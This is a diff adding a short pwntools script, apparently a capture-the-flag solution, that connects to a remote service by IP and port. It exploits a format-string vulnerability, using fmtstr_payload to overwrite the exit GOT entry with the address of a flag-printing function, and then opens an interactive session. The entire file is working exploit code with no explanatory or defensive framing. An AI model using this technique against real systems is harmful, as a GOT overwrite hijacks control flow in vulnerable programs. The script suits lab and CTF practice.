@@ -1,0 +1,18 @@
+#!/usr/bin/env python3
+from pwn import *
+
+p = remote('140.113.207.245', 30175)
+
+context.bits = 64
+
+exit_got = 0x404040
+putflag = 0x401256
+offset = 12  # %12$x 是我們輸入的 buf 起點
+
+# 自動構造格式化字串 payload
+payload = fmtstr_payload(offset, {exit_got: putflag})
+
+p.sendline(payload)
+p.sendline("exit")
+
+p.interactive()
